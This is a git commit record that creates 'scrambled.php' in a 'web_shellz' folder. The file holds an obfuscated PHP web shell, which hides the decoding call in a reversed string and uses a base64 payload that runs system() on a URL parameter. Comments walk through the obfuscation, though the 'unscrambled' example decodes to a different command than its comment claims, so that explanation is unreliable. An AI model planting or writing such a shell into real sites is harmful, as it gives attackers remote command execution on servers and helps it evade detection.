d31be5119b3d0f3feda41e42e7f11042205607c6
kymb0 <55473161+kymb0@users.noreply.github.com>
2020-11-05 09:26:00 +0930

    Create scrambled.php

---
+++ web_shellz/scrambled.php
@@ -0,0 +1,11 @@
+//scrambled:
+<?php $k='c3lzdGVtKCRfR0VUWyJjbWQiXSk=';$c=strrev('(edoced_46esab.""nruter')."'".$k."');";$f=eval($c);eval($f);?>
+
+// Unscrambled:
+// base_64 encoded string -> system($_GET["cmd"]);
+$k='c3lzdGVtKCdscyAtbGEnKTs=';
+// strrev() reverses a given string:   strrev('(edoced_46esab.""nruter')."'".$k."')
+$c= eval("return base64_decode('c3lzdGVtKCdscyAtbGEnKTs=');");
+// $c = system($_GET["cmd"]);
+$f=eval($c);
+eval($f);
